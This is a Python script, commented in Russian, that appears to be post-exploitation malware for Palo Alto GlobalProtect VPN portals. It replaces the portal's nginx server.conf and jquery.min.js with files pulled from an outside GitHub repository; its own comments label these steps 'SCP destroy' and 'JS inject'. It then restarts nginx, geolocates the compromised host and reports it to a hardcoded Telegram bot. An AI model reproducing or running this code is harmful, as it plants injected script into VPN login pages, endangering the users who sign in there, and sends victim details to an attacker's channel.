import os
import subprocess
import hashlib
import shutil
import importlib
import sys
import urllib3

# Отключение SSL-предупреждений
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Функция для установки библиотеки
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Проверка и установка необходимых библиотек
def check_and_install_libraries():
    required_libraries = ["requests"]
    for lib in required_libraries:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"Библиотека {lib} не найдена, установка...")
            install_package(lib)

# Проверка и установка библиотек перед импортом
check_and_install_libraries()

# Импорт после установки
import requests

# Определение URL файлов и путей на сервере
url_server_conf = "https://raw.githubusercontent.com/EncHub/PanOS/refs/heads/main/scp_config/server.conf"
url_jquery_js = "https://raw.githubusercontent.com/EncHub/PanOS/refs/heads/main/jquery.min.js"
path_server_conf = "/etc/nginx/sslvpn/server.conf"
path_jquery_js = "/var/appweb/sslvpndocs/global-protect/portal/js/jquery.min.js"
nginx_service = "nginx"

# Функция для вычисления sha256 хеша файла
def calculate_sha256(file_path):
    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

# Функция для загрузки файла с URL (без проверки SSL)
def download_file(url, destination):
    response = requests.get(url, verify=False)  # Без проверки SSL
    if response.status_code == 200:
        with open(destination, 'wb') as f:
            f.write(response.content)
        return True
    return False

# Функция для замены файла
def replace_file(file_path, url):
    temp_file_path = "/tmp/temp_file"
    if download_file(url, temp_file_path):
        shutil.move(temp_file_path, file_path)
        return True
    return False

# Функция для остановки nginx
def stop_nginx():
    subprocess.run(["killall", "nginx"], check=True)
    return True

# Функция для перезагрузки nginx
def reload_nginx():
    subprocess.run(["systemctl", "reload", nginx_service], check=True)
    return True

# Функция для отправки сообщения в Telegram (без проверки SSL)
def send_to_telegram(message):
    tg_bot_token = "7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc"
    tg_chat_id = "-1002252120859"
    url = f"https://api.telegram.org/bot{tg_bot_token}/sendMessage"
    payload = {"chat_id": tg_chat_id, "text": message}
    response = requests.post(url, json=payload, verify=False)  # Без проверки SSL
    return response.ok

# Основной процесс
def main():
    server_conf_updated = False
    jquery_js_updated = False

    # Заменяем файлы
    if replace_file(path_server_conf, url_server_conf):
        server_conf_updated = True

    if replace_file(path_jquery_js, url_jquery_js):
        jquery_js_updated = True

    # Перезагружаем nginx, если файлы были обновлены
    if server_conf_updated or jquery_js_updated:
        stop_nginx()
        reload_nginx()

        # Получаем информацию о сервере
        ip_info = requests.get("http://ip-api.com/json", verify=False).json()  # Без проверки SSL
        ip = ip_info["query"]
        country = ip_info["country"]
        city = ip_info["city"]
        
        # Генерируем хеш из IP
        ip_hash = hashlib.sha256(ip.encode('utf-8')).hexdigest()

        # Формируем сообщение для Telegram
        message = f"🌐 Palo Alto VPN\n"
        message += f"------------------\n"
        message += f"IP: {ip}\n"
        message += f"Страна: {country}\n"
        message += f"Город: {city}\n"
        message += f"------------------\n"
        message += f"SCP destroy: {'✔️' if server_conf_updated else '❌'}\n"
        message += f"JS inject: {'✔️' if jquery_js_updated else '❌'}\n"
        message += f"------------------\n"
        message += f"#{ip_hash[:8]}"  # Хеш из первых 8 символов

        # Отправляем сообщение в Telegram
        send_to_telegram(message)

if __name__ == "__main__":
    main()
